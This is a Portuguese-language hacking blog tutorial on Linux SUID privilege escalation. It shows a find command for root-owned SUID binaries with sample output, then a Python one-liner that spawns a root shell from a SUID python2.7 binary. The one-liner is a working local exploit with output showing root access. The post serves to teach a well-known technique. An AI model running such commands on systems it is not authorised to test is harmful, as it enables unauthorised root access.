---
layout: post
title:  "SUID Privilege Escalation"
date:   2020-09-07 17:30:00 -0300
categories: hacking
author: "ReddyyZ"
lang: pt-BR
tags: [privilege escalation, linux]
reading_time: 1 minute
---

Privilege escalation é um tipo de vulnerabilidade na qual o atacante consegue elevar seus privilégios para root ou algum outro usuário.<br>
Nesse artigo você vai aprender sobre como encontrar e explorar um privilege escalation.

## SUID Privilege Escalation

### O que é o SUID

BIT SUID é um tipo de permissão especial na qual o arquivo pode executar outros comandos como o usuário dono do arquivo.

![BIT SUID](/assets/images/suid.jpg)

Vamos a um exemplo:

O root é dono de um arquivo que executa o comando passado por argumento, este arquivo tem o bit SUID e todos os usuários tem permissão de executa-lo.

Se um usuário comum usar esse script para executar um comando, este comando será executado como root por causa do bit SUID.


### Encontrando arquivos com o bit SUID

Agora que já entendemos como funciona o bit SUID, vamos encontrar os arquivos com o bit SUID e que o dono seja o root.

Para isso usaremos uma ferramenta que já vem com o linux chamada find, vamos ao comando.
```sh
find / -user root -perm /4000 2>/dev/null
```
<button class="copy" onClick="copy_to_clip2('find / -user root -perm /4000 2>/dev/null')">Copiar comando</button>

Explicando o comando:

Especifica o dono do arquivo `-user root`<br>
Procura por arquivos com o bit SUID `-perm /4000`<br>
Esconde os erros `2>/dev/null`

Resultado:

```sh
reddyyz@fsociety~$ find / -user root -perm /4000 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/chromium/chrome-sandbox
/usr/lib/xorg/Xorg.wrap
/usr/libexec/spice-client-glib-usb-acl-helper
/usr/share/code/chrome-sandbox
/usr/sbin/mount.cifs
/usr/sbin/mount.nfs
/usr/sbin/pppd
/usr/bin/mount
/usr/bin/vmware-user-suid-wrapper
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/python2.7
/usr/bin/fusermount3
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/vncserver-x11
/usr/bin/kismet_cap_linux_wifi
/usr/bin/chfn
/usr/bin/bwrap
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/kismet_cap_linux_bluetooth
/usr/bin/ntfs-3g
/usr/bin/pkexec
/usr/bin/umount
/usr/bin/kismet_cap_nrf_mousejack
/usr/bin/Xtightvnc
/home/reddyyz/VMWARE/vmware-tools-distrib/lib/bin64/vmware-user-suid-wrapper
/home/reddyyz/VMWARE/vmware-tools-distrib/lib/bin32/vmware-user-suid-wrapper
```
Esses são todos os arquivos com permissão SUID que o dono é o root.

### Encontrando e explorando um privilege escalation

Olhando esses arquivos um que chama atenção é o `/usr/bin/python2.7`.<br>
Vamos olhar se existe algum exploit conhecido para o python no [GTFOBins](https://gtfobins.github.io/gtfobins/python/#suid), site com várias formas de privilege escalation.

![GTFOBins Python](/assets/images/gtfobins-python.PNG)

E achamos uma forma de escalar nossos privilégios.<br>
Vamos executar o comando `python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`

```sh
reddyyz@fsociety:~$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# whoami
root
# 
```
<button class="copy" onClick="document.get">Copiar comando</button>

E conseguimos escalar nossos privilégios com sucesso!